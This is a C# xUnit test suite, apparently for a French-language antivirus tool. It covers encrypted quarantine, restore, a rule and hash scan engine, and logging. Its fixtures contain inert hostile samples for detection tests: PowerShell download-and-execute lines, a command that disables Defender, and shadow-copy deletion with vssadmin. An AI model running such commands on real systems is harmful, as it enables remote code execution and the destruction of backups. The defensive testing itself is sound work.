using System.Text;
using SentinelAI.Core.Analysis;
using SentinelAI.Core.Models;
using SentinelAI.Core.Quarantine;
using SentinelAI.Core.Rules;
using SentinelAI.Core.Scanning;
using SentinelAI.Core.Storage;
using Xunit;

namespace SentinelAI.Core.Tests;

public class CoffreTests
{
    [Fact]
    public async Task Le_chiffrement_est_reversible()
    {
        using var bac = new BacASable();
        var source = bac.Ecrire("original.bin", new string('A', 200_000));
        var chiffre = Path.Combine(bac.Racine, "coffre.sntq");
        var restaure = Path.Combine(bac.Racine, "restaure.bin");
        var cle = VaultKey.ObtenirOuCreer();

        await VaultCipher.ChiffrerAsync(source, chiffre, cle);
        await VaultCipher.DechiffrerAsync(chiffre, restaure, cle);

        Assert.Equal(File.ReadAllBytes(source), File.ReadAllBytes(restaure));
    }

    [Fact]
    public async Task Le_contenu_chiffre_ne_ressemble_pas_a_l_original()
    {
        using var bac = new BacASable();
        var source = bac.Ecrire("script.ps1", "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://x')");
        var chiffre = Path.Combine(bac.Racine, "coffre.sntq");

        await VaultCipher.ChiffrerAsync(source, chiffre, VaultKey.ObtenirOuCreer());

        var contenu = Encoding.ASCII.GetString(File.ReadAllBytes(chiffre));
        Assert.DoesNotContain("Invoke-Expression", contenu);
    }

    [Fact]
    public async Task Un_coffre_altere_est_refuse()
    {
        using var bac = new BacASable();
        var source = bac.Ecrire("original.txt", "contenu sensible");
        var chiffre = Path.Combine(bac.Racine, "coffre.sntq");
        var cle = VaultKey.ObtenirOuCreer();

        await VaultCipher.ChiffrerAsync(source, chiffre, cle);

        // On modifie un octet du corps chiffre : l'authentification GCM doit echouer.
        var octets = File.ReadAllBytes(chiffre);
        octets[^20] ^= 0xFF;
        File.WriteAllBytes(chiffre, octets);

        await Assert.ThrowsAnyAsync<Exception>(() =>
            VaultCipher.DechiffrerAsync(chiffre, Path.Combine(bac.Racine, "sortie.txt"), cle));
    }

    [Fact]
    public async Task Un_fichier_vide_passe_par_le_coffre_sans_dommage()
    {
        using var bac = new BacASable();
        var source = bac.Ecrire("vide.txt", "");
        var chiffre = Path.Combine(bac.Racine, "vide.sntq");
        var restaure = Path.Combine(bac.Racine, "vide-restaure.txt");
        var cle = VaultKey.ObtenirOuCreer();

        await VaultCipher.ChiffrerAsync(source, chiffre, cle);
        await VaultCipher.DechiffrerAsync(chiffre, restaure, cle);

        Assert.Empty(File.ReadAllBytes(restaure));
    }
}

public class QuarantaineTests
{
    private static (QuarantineService Service, SentinelDatabase Base) Construire(BacASable bac)
    {
        var baseDonnees = new SentinelDatabase(Path.Combine(bac.Racine, "test.db"));
        var journal = new JournalService(Path.Combine(bac.Racine, "journaux"));
        return (new QuarantineService(baseDonnees, journal, Path.Combine(bac.Racine, "coffre")), baseDonnees);
    }

    [Fact]
    public async Task La_mise_en_quarantaine_retire_l_original_et_conserve_le_contenu()
    {
        using var bac = new BacASable();
        var (service, _) = Construire(bac);
        var chemin = bac.Ecrire("suspect.ps1", "IEX (New-Object Net.WebClient).DownloadString('http://x')");
        var empreinteAvant = await new FileHasher().Sha256Async(chemin);

        var resultat = await service.MettreEnQuarantaineAsync(chemin, "test");

        Assert.True(resultat.Reussi, resultat.Message);
        Assert.False(File.Exists(chemin));
        Assert.NotNull(resultat.Element);
        Assert.Equal(empreinteAvant, resultat.Element!.Sha256);
        Assert.Single(service.Lister());
    }

    [Fact]
    public async Task La_restauration_rend_un_fichier_identique_a_l_original()
    {
        using var bac = new BacASable();
        var (service, _) = Construire(bac);
        var chemin = bac.Ecrire("suspect.bat", "vssadmin delete shadows /all");
        var contenuAvant = File.ReadAllBytes(chemin);

        var miseEnQuarantaine = await service.MettreEnQuarantaineAsync(chemin, "test");
        var restauration = await service.RestaurerAsync(miseEnQuarantaine.Element!.Id);

        Assert.True(restauration.Reussi, restauration.Message);
        Assert.True(File.Exists(chemin));
        Assert.Equal(contenuAvant, File.ReadAllBytes(chemin));
    }

    [Fact]
    public async Task La_restauration_refuse_d_ecraser_sans_confirmation()
    {
        using var bac = new BacASable();
        var (service, _) = Construire(bac);
        var chemin = bac.Ecrire("collision.js", "eval(x)");

        var miseEnQuarantaine = await service.MettreEnQuarantaineAsync(chemin, "test");
        File.WriteAllText(chemin, "un autre fichier a pris la place");

        var refus = await service.RestaurerAsync(miseEnQuarantaine.Element!.Id);
        Assert.False(refus.Reussi);
        Assert.Contains("existe déjà", refus.Message);

        var accepte = await service.RestaurerAsync(miseEnQuarantaine.Element!.Id, ecraser: true);
        Assert.True(accepte.Reussi, accepte.Message);
        Assert.Equal("eval(x)", File.ReadAllText(chemin));
    }

    [Fact]
    public async Task Un_element_ne_peut_pas_etre_restaure_deux_fois()
    {
        using var bac = new BacASable();
        var (service, _) = Construire(bac);
        var chemin = bac.Ecrire("unique.vbs", "WScript.Shell");

        var miseEnQuarantaine = await service.MettreEnQuarantaineAsync(chemin, "test");
        await service.RestaurerAsync(miseEnQuarantaine.Element!.Id);
        var seconde = await service.RestaurerAsync(miseEnQuarantaine.Element!.Id);

        Assert.False(seconde.Reussi);
    }

    [Fact]
    public async Task La_suppression_definitive_vide_le_coffre_mais_garde_la_trace()
    {
        using var bac = new BacASable();
        var (service, _) = Construire(bac);
        var chemin = bac.Ecrire("adieu.exe", "MZ contenu");

        var miseEnQuarantaine = await service.MettreEnQuarantaineAsync(chemin, "test");
        var suppression = service.SupprimerDefinitivement(miseEnQuarantaine.Element!.Id);

        Assert.True(suppression.Reussi, suppression.Message);
        Assert.Empty(service.Lister());
        Assert.Single(service.Lister(actifsUniquement: false));
        Assert.Equal(QuarantineState.SupprimeDefinitivement, service.Lire(miseEnQuarantaine.Element!.Id)!.Etat);
    }

    [Fact]
    public async Task Un_fichier_absent_produit_un_echec_explicite()
    {
        using var bac = new BacASable();
        var (service, _) = Construire(bac);

        var resultat = await service.MettreEnQuarantaineAsync(Path.Combine(bac.Racine, "fantome.exe"), "test");

        Assert.False(resultat.Reussi);
        Assert.Contains("introuvable", resultat.Message);
    }
}

public class MoteurAnalyseTests
{
    private static ScanEngine Construire(BacASable bac)
    {
        var baseDonnees = new SentinelDatabase(Path.Combine(bac.Racine, "test.db"));
        return new ScanEngine(
            new RuleEngine(RuleEngine.ChargerIntegrees()),
            new HashBlocklist(),
            new UnsupportedAuthenticodeVerifier(),
            new JournalService(Path.Combine(bac.Racine, "journaux")),
            new ScanRepository(baseDonnees));
    }

    [Fact]
    public async Task Un_script_malveillant_ressort_en_niveau_eleve()
    {
        using var bac = new BacASable();
        var moteur = Construire(bac);
        var chemin = bac.Ecrire("charge.ps1", """
            $c = New-Object Net.WebClient
            IEX $c.DownloadString('http://exemple.test/charge.ps1')
            Set-MpPreference -DisableRealtimeMonitoring $true
            """);

        var analyse = await moteur.AnalyserFichierAsync(chemin);

        Assert.True(analyse.Niveau >= RiskLevel.Eleve, $"niveau obtenu : {analyse.Niveau} ({analyse.Score})");
        Assert.NotNull(analyse.Sha256);
        Assert.True(analyse.TypeSensible);
        Assert.NotEmpty(analyse.Explications);
        Assert.Contains(analyse.Indicateurs, i => i.Id == "DEF-TAMP-001");
    }

    [Fact]
    public async Task Un_fichier_texte_ordinaire_reste_sain()
    {
        using var bac = new BacASable();
        var moteur = Construire(bac);
        var chemin = bac.Ecrire("notes.txt", "Rappel : appeler le fournisseur mardi matin.");

        var analyse = await moteur.AnalyserFichierAsync(chemin);

        Assert.Equal(RiskLevel.Sain, analyse.Niveau);
        Assert.False(analyse.TypeSensible);
        Assert.Empty(analyse.Indicateurs);
    }

    [Fact]
    public async Task Une_empreinte_repertoriee_declenche_le_niveau_critique()
    {
        using var bac = new BacASable();
        var chemin = bac.Ecrire("connu.txt", "abc");
        var liste = new HashBlocklist(new Dictionary<string, string>
        {
            ["ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"] = "Test.Eicar.Simulation"
        });

        var moteur = new ScanEngine(
            new RuleEngine([]), liste, new UnsupportedAuthenticodeVerifier());

        var analyse = await moteur.AnalyserFichierAsync(chemin);

        Assert.Equal(RiskLevel.Critique, analyse.Niveau);
        Assert.Equal(100, analyse.Score);
        Assert.Contains(analyse.Indicateurs, i => i.Preuve == "Test.Eicar.Simulation");
    }

    [Fact]
    public async Task L_analyse_d_un_dossier_couvre_les_sous_dossiers_et_journalise()
    {
        using var bac = new BacASable();
        var moteur = Construire(bac);
        var dossier = Path.Combine(bac.Racine, "cible");
        Directory.CreateDirectory(Path.Combine(dossier, "sous-dossier"));
        File.WriteAllText(Path.Combine(dossier, "propre.txt"), "rien à signaler");
        File.WriteAllText(Path.Combine(dossier, "sous-dossier", "charge.bat"), "vssadmin delete shadows /all /quiet");

        var rapport = await moteur.AnalyserAsync(dossier);

        Assert.Equal(2, rapport.FichiersAnalyses);
        Assert.Equal(1, rapport.Suspects);
        Assert.False(rapport.Annulee);

        var depot = new ScanRepository(new SentinelDatabase(Path.Combine(bac.Racine, "test.db")));
        Assert.Single(depot.DernieresAnalyses(), a => a.Id == rapport.Id);
        Assert.NotEmpty(depot.Resultats(rapport.Id));
    }

    [Fact]
    public async Task L_option_types_sensibles_reduit_le_perimetre()
    {
        using var bac = new BacASable();
        var moteur = Construire(bac);
        var dossier = Path.Combine(bac.Racine, "melange");
        Directory.CreateDirectory(dossier);
        File.WriteAllText(Path.Combine(dossier, "note.txt"), "texte");
        File.WriteAllText(Path.Combine(dossier, "image.png"), "faux png");
        File.WriteAllText(Path.Combine(dossier, "script.ps1"), "Write-Host 'ok'");

        var rapport = await moteur.AnalyserAsync(dossier, new ScanOptions { TypesSensiblesUniquement = true });

        Assert.Equal(1, rapport.FichiersAnalyses);
        Assert.EndsWith(".ps1", rapport.Resultats[0].Chemin);
    }

    [Fact]
    public void Le_coffre_de_quarantaine_n_est_jamais_analyse()
    {
        using var bac = new BacASable();
        var moteur = Construire(bac);
        Directory.CreateDirectory(SentinelPaths.QuarantineDirectory);
        File.WriteAllText(Path.Combine(SentinelPaths.QuarantineDirectory, "element.sntq"), "contenu chiffré");
        File.WriteAllText(Path.Combine(bac.Racine, "visible.txt"), "texte");

        var fichiers = moteur.Enumerer(bac.Racine, new ScanOptions()).ToList();

        Assert.DoesNotContain(fichiers, f => f.Contains("quarantaine"));
        Assert.Contains(fichiers, f => f.EndsWith("visible.txt"));
    }

    [Fact]
    public async Task Un_fichier_illisible_produit_une_erreur_et_non_une_exception()
    {
        using var bac = new BacASable();
        var moteur = Construire(bac);

        var analyse = await moteur.AnalyserFichierAsync(Path.Combine(bac.Racine, "inexistant.exe"));

        Assert.True(analyse.EnErreur);
        Assert.Equal(RiskLevel.Sain, analyse.Niveau);
    }
}

public class BaseDeDonneesTests
{
    [Fact]
    public void Les_parametres_sont_persistes()
    {
        using var bac = new BacASable();
        var baseDonnees = new SentinelDatabase(Path.Combine(bac.Racine, "test.db"));

        baseDonnees.EcrireParametre("langue", "fr-CA");
        baseDonnees.EcrireParametre("langue", "fr-FR");

        Assert.Equal("fr-FR", baseDonnees.LireParametre("langue"));
        Assert.Null(baseDonnees.LireParametre("absent"));
    }

    [Fact]
    public void Le_journal_ecrit_les_deux_formats()
    {
        using var bac = new BacASable();
        var journal = new JournalService(Path.Combine(bac.Racine, "journaux"));

        journal.Ecrire(JournalLevel.Info, "test.evenement", "Message de test.");

        Assert.True(File.Exists(journal.FichierJsonDuJour));
        Assert.True(File.Exists(journal.FichierTexteDuJour));
        Assert.Contains("test.evenement", File.ReadAllText(journal.FichierTexteDuJour));
        Assert.Contains("\"evenement\":\"test.evenement\"", File.ReadAllText(journal.FichierJsonDuJour));
    }
}
